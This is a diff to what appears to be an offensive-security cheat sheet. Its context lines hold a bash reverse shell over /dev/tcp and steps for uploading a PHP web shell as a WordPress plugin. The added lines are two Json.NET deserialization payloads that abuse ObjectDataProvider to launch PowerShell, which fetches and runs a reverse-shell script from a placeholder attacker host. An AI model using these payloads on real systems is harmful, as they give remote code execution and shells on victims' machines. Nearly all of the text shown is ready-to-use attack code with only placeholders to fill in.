@@ -1405,9 +1405,31 @@ exec("/bin/bash -c 'bash -i > /dev/tcp/{IP}/{PORT} 0>&1'");
 => zip shell.zip shell.php
 => Upload Plugin and Activate
 
+#INDEX
 
+#EXAMPLE
 
+{
+    '$type':'System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35',
+    'MethodName':'Start',
+    'MethodParameters':{
+        '$type':'System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
+        '$values':['cmd', '/c powershell.exe iex(iwr -usebasicparsing http://{IP}/Invoke-PowerShellTcp.ps1)']
+    },
+    'ObjectInstance':{'$type':'System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'}
+}
 
+#EXAMPLE
 
+{
+    '$type':'System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35',
+    'MethodName':'Start',
+    'MethodParameters':{
+        '$type':'System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
+        '$values':['powershell', 'iex(iwr -usebasicparsing http://{IP}/Invoke-PowerShellTcp.ps1)']
+    },
+    'ObjectInstance':{'$type':'System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'}
+}
 
-
+## References
+- https://medium.com/r3d-buck3t/insecure-deserialization-with-json-net-c70139af011a
